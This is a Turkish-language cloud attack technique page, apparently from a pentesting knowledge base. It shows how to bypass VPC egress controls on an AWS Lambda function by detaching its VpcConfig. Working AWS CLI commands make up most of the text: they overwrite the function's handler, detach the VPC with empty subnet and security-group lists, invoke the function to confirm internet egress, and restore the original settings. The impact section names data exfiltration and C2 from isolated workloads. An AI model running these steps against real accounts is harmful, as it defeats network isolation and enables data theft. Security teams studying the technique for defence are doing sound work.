# AWS Lambda – VPC Egress Bypass VpcConfig'i Ayırarak

Bir Lambda fonksiyonunu, VpcConfig'ini boş (SubnetIds=[], SecurityGroupIds=[]) olarak güncelleyerek kısıtlı bir VPC'den çıkarmaya zorlayın. Fonksiyon daha sonra Lambda tarafından yönetilen ağ düzleminde çalışacak, çıkış (egress) internet erişimini yeniden kazanacak ve NAT olmayan özel VPC alt ağlarının uyguladığı egress kontrollerini atlayacaktır.

## Kötüye Kullanımı

- Önkoşullar: hedef fonksiyon için lambda:UpdateFunctionConfiguration (ve doğrulama için lambda:InvokeFunction), ayrıca kod/handler'ı değiştiriyorsanız bunları güncelleme izinleri.
- Varsayımlar: Fonksiyon şu anda NAT olmayan özel alt ağlara işaret eden VpcConfig ile yapılandırılmıştır (yani çıkış interneti engellenmiştir).
- Bölge: us-east-1

### Adımlar

0) Çıkış HTTP'sinin çalıştığını kanıtlayan minimal bir handler hazırla

cat > net.py <<'PY'
import urllib.request, json

def lambda_handler(event, context):
try:
ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=3).read().decode().strip()
return {"egress": True, "ip": ip}
except Exception as e:
return {"egress": False, "err": str(e)}
PY
zip net.zip net.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://net.zip --region $REGION || true
aws lambda update-function-configuration --function-name $TARGET_FN --handler net.lambda_handler --region $REGION || true

1) Mevcut VPC konfigürasyonunu kaydet (gerekirse daha sonra geri yüklemek için)

aws lambda get-function-configuration --function-name $TARGET_FN --query 'VpcConfig' --region $REGION > /tmp/orig-vpc.json
cat /tmp/orig-vpc.json

2) Boş listeler ayarlayarak VPC'yi ayır

aws lambda update-function-configuration \
--function-name $TARGET_FN \
--vpc-config SubnetIds=[],SecurityGroupIds=[] \
--region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done

3) Fonksiyonu çağır ve çıkış erişimini doğrula

aws lambda invoke --function-name $TARGET_FN /tmp/net-out.json --region $REGION >/dev/null
cat /tmp/net-out.json

(Optional) Orijinal VPC konfigürasyonunu geri yükle

if jq -e '.SubnetIds | length > 0' /tmp/orig-vpc.json >/dev/null; then
SUBS=$(jq -r '.SubnetIds | join(",")' /tmp/orig-vpc.json); SGS=$(jq -r '.SecurityGroupIds | join(",")' /tmp/orig-vpc.json)
aws lambda update-function-configuration --function-name $TARGET_FN --vpc-config SubnetIds=[$SUBS],SecurityGroupIds=[$SGS] --region $REGION
fi

### Etki
- Fonksiyonun kısıtlanmamış çıkış internet erişimini geri kazanır; bu, NAT olmayan özel alt ağlarda kasıtlı olarak izole edilmiş iş yüklerinden veri sızdırma veya C2 sağlamaya imkan verir.

### Örnek çıktı (VpcConfig'i ayırdıktan sonra)

{"egress": true, "ip": "34.x.x.x"}

### Temizlik
- Geçici kod/handler değişiklikleri yaptıysanız, bunları geri yükleyin.
- İsteğe bağlı olarak yukarıda gösterildiği gibi /tmp/orig-vpc.json içinde kaydedilmiş orijinal VpcConfig'i geri yükleyin.
